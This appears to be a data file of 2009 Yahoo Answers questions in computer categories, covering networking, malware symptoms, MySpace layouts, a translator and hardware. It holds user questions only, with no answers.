20090128183313AA723Ct	Computers & Internet;Hardware;Add-ons	Should I delete the " big fix " on my emachine?	I am using windows vista home edition and am able to solve problems with microsoft tools, so I wonder what the big fix is doing.........other than taking up disk space.
20090128183503AAFU5bw	Computers & Internet;Computer Networking	Windows XP Pro networking questions?	Here is the situation. Each computer has a static IP address for simplicity sake.      One computer is at building number 1 where the connection to the ISP arrives. At that building the connection splits in a Router (D-Link WBR2310) where it's transmitted wirelessly over to the house about 1km away.      Within the house the connection come in via a wireless network bridge (EnGenius) where it's output is fed to a second wireless router (D-Link DI-524). From here the internet is fed to two computers via Cat 5 cable and two laptops via wireless. No firewalls are enabled on any of the household computers, nor at building 1.      Connection strength and quality are consistent and good, no dropouts or other complaints for many months ever since set up.      My questions:   1) If I were to let the computers connect via DHCP, how could I uniquely identify them on the network so other users could share files within the house and at the building 1?      2) File and print sharing. From the computers in the house via Network browser, it is impossible to "see" the computer over at building number one. Network browser shows computers which are behind the DI-524 only.      The only scheme which lets users access and transfer files to/from that solitary computer is Remote Desktop (which works just fine).      I'd like to refine this network so DHCP is the rule and so all Windows file and print sharing protocols work seamlessly through the wireless.      The DI-524 seems to be preventing this and even when I set up DMZ for any specific computer's static IP address, I still cannot overcome some kind of blockage of Windows file and print sharing.
20090128183539AAgY40q	Computers & Internet;Other - Computers	I need to know how to BREAK MY COMPUTER RIGHT THIS INSTANT?	itz a very long story, but i need to break my computer now now now now now NOW.       i tried deleting system32 but my computer doesn't let me. wat is another way, that isn't visible, so my parents wont actually see tat i physically broke my computer?
20090128183525AASBomC	Computers & Internet;Security	Does frostwire slow down your computer?	if it does whats another kind of website thats like frostwire that does NOT freeze ur computer and thats free??
20090128183459AAwqU0w	Computers & Internet;Programming & Design	Is there a free online text translator with automatic detection?	I got a personal email from someone but it's in a different language and I don't know what language it's in.  Is there a free online translator that can automatically detect the language of the text and translate it into english?
20090128183429AA1EfdG	Computers & Internet;Security	Internet problem, or malware!!?	Well, i try to get into websites and they keep changing like to some adult friend website and other or just simply will say that i dont hve internet connection, before it didnt let me go into my hardisk and now it shows that, i mean i got rid of that resycled thing with a software bu ti don't what i got, i mean on internet just chnages websites or just tells me i have no connection and in the browsers shows my IP adress
20090128183504AAOHnTx	Computers & Internet;Programming & Design	How do you make links open on the same page on a div layout? ?	How do you make the navigation links open on the same page on a myspace DIV layout? Mine keep opening on a new page! My friend id is 122566927. Please help!
20090128183523AAHFgKG	Computers & Internet;Programming & Design	Gimp web layout to css?	how do i take a gimp web layout to css? with out using dreamweaver
20090128183525AAApz0g	Computers & Internet;Hardware;Other - Hardware	Whats the best geforce graphic card to get ?	N/A
20090128183604AAkEgL2	Computers & Internet;Internet;MySpace	Myspace help!!!!!!!!!!!!?	when ever i log on to myspace     in my home page   a messege appaers  it says internet  ex plorer     canot oppen this page opperation aboorted       but when some one else gets on it   it   dosent happen so wtf
